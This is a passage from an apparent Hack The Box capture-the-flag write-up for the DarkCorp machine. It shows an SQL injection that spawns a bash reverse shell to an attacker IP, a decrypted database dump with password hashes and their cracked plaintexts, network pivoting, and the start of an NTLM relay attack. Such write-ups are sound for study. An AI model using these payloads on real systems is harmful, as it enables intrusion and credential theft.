<p>SIDE NOTE:<br>noticed the first link: <a class="link"   target="_blank" rel="noopener" href="http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z67uyw.qKq2xqbpySG1wnw6mq0EMnMA1qI" >http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z67uyw.qKq2xqbpySG1wnw6mq0EMnMA1qI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>and second link: <a class="link"   target="_blank" rel="noopener" href="http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z67yeQ.JowFY4TQdpIcKVu12DqU7lScefI" >http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z67yeQ.JowFY4TQdpIcKVu12DqU7lScefI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>They have this in common:<a class="link"   target="_blank" rel="noopener" href="http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z67" >http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z67 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/DarkCorp/web2.png"
                      alt="Web App"
                ><figcaption>Web App</figcaption></figure></p>
<p>We can discover an SQL injection with some testing:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>; <span class="keyword">SELECT</span> pg_read_file(<span class="string">&#x27;/var/log/postgresql/postgresql-15-main.log&#x27;</span>, <span class="number">0</span>, <span class="number">1000000</span>);</span><br></pre></td></tr></table></figure></div>
<p>We get this data back:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|ID|Username|E-Mail|Host Header|IP Address|</span><br><span class="line">|---|---|---|---|---|</span><br><span class="line">|5001|support|support@drip.htb|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0|10.0.50.10|</span><br><span class="line">|5002|bcase|bcase@drip.htb|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0|10.0.50.10|</span><br><span class="line">|5003|ebelford|ebelford@drip.htb|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0|10.0.50.10|</span><br><span class="line">|5004|kujen|kujen@drip.htb|Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0|172.16.20.1|</span><br></pre></td></tr></table></figure></div>

<p>I can also get a reverse shell:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>;DO $$ <span class="keyword">DECLARE</span> c text; <span class="keyword">BEGIN</span> c:<span class="operator">=</span>CHR(<span class="number">67</span>)<span class="operator">||</span>CHR(<span class="number">79</span>)<span class="operator">||</span>CHR(<span class="number">80</span>)<span class="operator">||</span>CHR(<span class="number">89</span>)<span class="operator">||</span><span class="string">&#x27; (SELECT &#x27;&#x27;&#x27;&#x27;) to program &#x27;&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9001 0&gt;&amp;1&quot;&#x27;&#x27;&#x27;</span>;<span class="keyword">EXECUTE</span> c; <span class="keyword">END</span> $$;</span><br></pre></td></tr></table></figure></div>

<p>And we get it on our listener:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.20] from (UNKNOWN) [10.129.161.63] 49960</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (156517): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">postgres@drip:/var/lib/postgresql/15/main$</span><br></pre></td></tr></table></figure></div>
<p>Checking the <code>/etc/hosts</code> file, we get the DC access:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">postgres@drip:/var/lib/postgresql/15/main$ <span class="built_in">cat</span> /etc/hosts</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1       localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following lines are desirable for IPv6 capable hosts</span></span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line"></span><br><span class="line">172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb</span><br><span class="line">172.16.20.3 drip.darkcorp.htb</span><br><span class="line">postgres@drip:/var/lib/postgresql/15/main$</span><br></pre></td></tr></table></figure></div>
<p>We can use the postgres data we got earlier to decode the postgres DB:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postgres@drip:/var/lib/postgresql/15/main$ gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback  --passphrase 2Qa2SsBkQvsc --use-agent --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg &gt; dev-dripmail.old.sql</span><br><span class="line">&lt;res/dev-dripmail.old.sql.gpg &gt; dev-dripmail.old.sql</span><br><span class="line">gpg: encrypted with 3072-bit RSA key, ID 1112336661D8BC1F, created 2025-01-08</span><br><span class="line">      <span class="string">&quot;postgres &lt;postgres@drip.darkcorp.htb&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>In it we find some user hashes:</p>
<details>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">postgres@drip:/var/lib/postgresql/15/main$ <span class="built_in">cat</span> dev-dripmail.old.sql</span><br><span class="line"><span class="built_in">cat</span> dev-dripmail.old.sql</span><br><span class="line">--                                                                                                                                                                                                                                          </span><br><span class="line">-- PostgreSQL database dump                                                                                                                                                                                                                 </span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">-- Dumped from database version 15.10 (Debian 15.10-0+deb12u1)</span><br><span class="line">-- Dumped by pg_dump version 15.10 (Debian 15.10-0+deb12u1)</span><br><span class="line"></span><br><span class="line">SET statement_timeout = 0;</span><br><span class="line">SET lock_timeout = 0;</span><br><span class="line">SET idle_in_transaction_session_timeout = 0;</span><br><span class="line">SET client_encoding = <span class="string">&#x27;UTF8&#x27;</span>;</span><br><span class="line">SET standard_conforming_strings = on;</span><br><span class="line">SELECT pg_catalog.set_config(<span class="string">&#x27;search_path&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">SET check_function_bodies = <span class="literal">false</span>;</span><br><span class="line">SET xmloption = content;</span><br><span class="line">SET client_min_messages = warning;</span><br><span class="line">SET row_security = off;</span><br><span class="line"></span><br><span class="line">SET default_tablespace = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">SET default_table_access_method = heap;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Admins; Type: TABLE; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE TABLE public.<span class="string">&quot;Admins&quot;</span> (</span><br><span class="line">    <span class="built_in">id</span> <span class="built_in">integer</span> NOT NULL,</span><br><span class="line">    username character varying(80),</span><br><span class="line">    password character varying(80),</span><br><span class="line">    email character varying(80)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALTER TABLE public.<span class="string">&quot;Admins&quot;</span> OWNER TO postgres;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Admins_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE SEQUENCE public.<span class="string">&quot;Admins_id_seq&quot;</span></span><br><span class="line">    AS <span class="built_in">integer</span></span><br><span class="line">    START WITH 1</span><br><span class="line">    INCREMENT BY 1</span><br><span class="line">    NO MINVALUE</span><br><span class="line">    NO MAXVALUE</span><br><span class="line">    CACHE 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALTER TABLE public.<span class="string">&quot;Admins_id_seq&quot;</span> OWNER TO postgres;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Admins_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">ALTER SEQUENCE public.<span class="string">&quot;Admins_id_seq&quot;</span> OWNED BY public.<span class="string">&quot;Admins&quot;</span>.<span class="built_in">id</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Users; Type: TABLE; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE TABLE public.<span class="string">&quot;Users&quot;</span> (</span><br><span class="line">    <span class="built_in">id</span> <span class="built_in">integer</span> NOT NULL,</span><br><span class="line">    username character varying(80),</span><br><span class="line">    password character varying(80),</span><br><span class="line">    email character varying(80),</span><br><span class="line">    host_header character varying(255),</span><br><span class="line">    ip_address character varying(80)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALTER TABLE public.<span class="string">&quot;Users&quot;</span> OWNER TO postgres;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE SEQUENCE public.<span class="string">&quot;Users_id_seq&quot;</span></span><br><span class="line">    AS <span class="built_in">integer</span></span><br><span class="line">    START WITH 1</span><br><span class="line">    INCREMENT BY 1</span><br><span class="line">    NO MINVALUE</span><br><span class="line">    NO MAXVALUE</span><br><span class="line">    CACHE 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALTER TABLE public.<span class="string">&quot;Users_id_seq&quot;</span> OWNER TO postgres;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">ALTER SEQUENCE public.<span class="string">&quot;Users_id_seq&quot;</span> OWNED BY public.<span class="string">&quot;Users&quot;</span>.<span class="built_in">id</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Admins <span class="built_in">id</span>; Type: DEFAULT; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">ALTER TABLE ONLY public.<span class="string">&quot;Admins&quot;</span> ALTER COLUMN <span class="built_in">id</span> SET DEFAULT nextval(<span class="string">&#x27;public.&quot;Admins_id_seq&quot;&#x27;</span>::regclass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Users <span class="built_in">id</span>; Type: DEFAULT; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">ALTER TABLE ONLY public.<span class="string">&quot;Users&quot;</span> ALTER COLUMN <span class="built_in">id</span> SET DEFAULT nextval(<span class="string">&#x27;public.&quot;Users_id_seq&quot;&#x27;</span>::regclass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Data <span class="keyword">for</span> Name: Admins; Type: TABLE DATA; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">COPY public.<span class="string">&quot;Admins&quot;</span> (<span class="built_in">id</span>, username, password, email) FROM stdin;</span><br><span class="line">1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb</span><br><span class="line">2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb</span><br><span class="line">3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb</span><br><span class="line">\.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Data <span class="keyword">for</span> Name: Users; Type: TABLE DATA; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">COPY public.<span class="string">&quot;Users&quot;</span> (<span class="built_in">id</span>, username, password, email, host_header, ip_address) FROM stdin;</span><br><span class="line">5001    support d9b9ecbf29db8054b21f303072b37c4e        support@drip.htb        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10</span><br><span class="line">5002    bcase   1eace53df87b9a15a37fdc11da2d298d        bcase@drip.htb  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10</span><br><span class="line">5003    ebelford        0cebd84e066fd988e89083879e88c5f9        ebelford@drip.htb       Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0   10.0.50.10</span><br><span class="line">\.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Admins_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">SELECT pg_catalog.setval(<span class="string">&#x27;public.&quot;Admins_id_seq&quot;&#x27;</span>, 1, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">SELECT pg_catalog.setval(<span class="string">&#x27;public.&quot;Users_id_seq&quot;&#x27;</span>, 5003, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Admins Admins_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">ALTER TABLE ONLY public.<span class="string">&quot;Admins&quot;</span></span><br><span class="line">    ADD CONSTRAINT <span class="string">&quot;Admins_pkey&quot;</span> PRIMARY KEY (<span class="built_in">id</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: Users Users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">ALTER TABLE ONLY public.<span class="string">&quot;Users&quot;</span></span><br><span class="line">    ADD CONSTRAINT <span class="string">&quot;Users_pkey&quot;</span> PRIMARY KEY (<span class="built_in">id</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: TABLE <span class="string">&quot;Admins&quot;</span>; Type: ACL; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">GRANT SELECT ON TABLE public.<span class="string">&quot;Admins&quot;</span> TO dripmail_dba;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: SEQUENCE <span class="string">&quot;Admins_id_seq&quot;</span>; Type: ACL; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">GRANT ALL ON SEQUENCE public.<span class="string">&quot;Admins_id_seq&quot;</span> TO dripmail_dba;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: TABLE <span class="string">&quot;Users&quot;</span>; Type: ACL; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">GRANT SELECT ON TABLE public.<span class="string">&quot;Users&quot;</span> TO dripmail_dba;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Name: SEQUENCE <span class="string">&quot;Users_id_seq&quot;</span>; Type: ACL; Schema: public; Owner: postgres</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">GRANT ALL ON SEQUENCE public.<span class="string">&quot;Users_id_seq&quot;</span> TO dripmail_dba;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- PostgreSQL database dump complete</span><br></pre></td></tr></table></figure></div>

</details>

<p>Crack <code>8bbd7f88841b4223ae63c8848969be86</code> with hashcat mode 0:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ebelford:8bbd7f88841b4223ae63c8848969be86:ThePlague61780</span><br><span class="line">victor.r:cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>We connect to the web server is 172.16.20.2:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ebelford@drip.htb -L 5000:172.16.20.2:5000</span><br></pre></td></tr></table></figure></div>

<p>Now access it with victor creds.<br>Requests are using NTLM auth: <code>Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAgAAAAAAAAACAAAAA=</code></p>
<h3 id="NTLM-Relay-Attack"><a href="#NTLM-Relay-Attack" class="headerlink" title="NTLM Relay Attack"></a>NTLM Relay Attack</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.horizon3.ai/attack-research/n0-attack-paths/the-elephant-in-the-room-ntlm-coercion-and-understanding-its-impact/" >https://www.horizon3.ai/attack-research/n0-attack-paths/the-elephant-in-the-room-ntlm-coercion-and-understanding-its-impact/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx" >https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>first sshuttle to forward everything:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshuttle -r ebelford:<span class="string">&#x27;ThePlague61780&#x27;</span>@drip.htb 172.16.20.0/24 -vv</span><br></pre></td></tr></table></figure></div>

<p>Then take ligolo and forward 172.16.20.3:8080 &#x3D;&gt; 10.10.16.20:80:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/ligolo]</span><br><span class="line">â””â”€$ ./proxy -selfcert -laddr 0.0.0.0:11601</span><br><span class="line">WARN[0000] Using default selfcert domain <span class="string">&#x27;ligolo&#x27;</span>, beware of CTI, SOC and IoC! </span><br><span class="line">WARN[0000] Using self-signed certificates               </span><br><span class="line">WARN[0000] TLS Certificate fingerprint <span class="keyword">for</span> ligolo is: D871C6F4F0C13D0CDD8E7A4AB12780DB6BE86D61718A9DFF51F70E1786E57860 </span><br><span class="line">INFO[0000] Listening on 0.0.0.0:11601                   </span><br><span class="line">    __    _             __                       </span><br><span class="line">   / /   (_)___ _____  / /___        ____  ____ _</span><br><span class="line">  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/</span><br><span class="line"> / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / </span><br><span class="line">/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  </span><br><span class="line">        /____/                          /____/   </span><br><span class="line"></span><br><span class="line">  Made <span class="keyword">in</span> France â™¥            by @Nicocha30!</span><br><span class="line">  Version: 0.7.5</span><br><span class="line"></span><br><span class="line">ligolo-ng Â» INFO[0007] Agent joined.                                 <span class="built_in">id</span>=da830dd7-68ba-4e22-9af4-6d4ab6ebe1ca name=ebelford@drip remote=<span class="string">&quot;10.129.190.115:49954&quot;</span></span><br><span class="line">ligolo-ng Â» </span><br><span class="line">ligolo-ng Â» session</span><br><span class="line">? Specify a session : 1 - ebelford@drip - 10.129.190.115:49954 - da830dd7-68ba-4e22-9af4-6d4ab6ebe1ca</span><br><span class="line">[Agent : ebelford@drip] Â» start</span><br><span class="line">[Agent : ebelford@drip] Â» INFO[0017] Starting tunnel to ebelford@drip (da830dd7-68ba-4e22-9af4-6d4ab6ebe1ca) </span><br><span class="line">[Agent : ebelford@drip] Â» </span><br><span class="line">[Agent : ebelford@drip] Â» listener_add --addr 172.16.20.3:8080 --to 127.0.0.1:80 --tcp</span><br><span class="line">INFO[0035] Listener 0 created on remote agent!          </span><br><span class="line">[Agent : ebelford@drip] Â» ERRO[0110] <span class="built_in">read</span> tcp 127.0.0.1:50878-&gt;127.0.0.1:80: use of closed network connection </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ebelford@drip:~$ ./agent -connect 10.10.16.20:11601 -ignore-cert</span><br><span class="line">WARN[0000] warning, certificate validation disabled     </span><br><span class="line">INFO[0000] Connection established     </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<p>Then: First:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/DarkCorp/PetitPotam]</span><br><span class="line">â””â”€$ sudo impacket-ntlmrelayx -t <span class="string">&quot;ldap://172.16.20.1&quot;</span> --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record <span class="string">&#x27;dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27;</span> 10.10.16.20     </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client HTTP 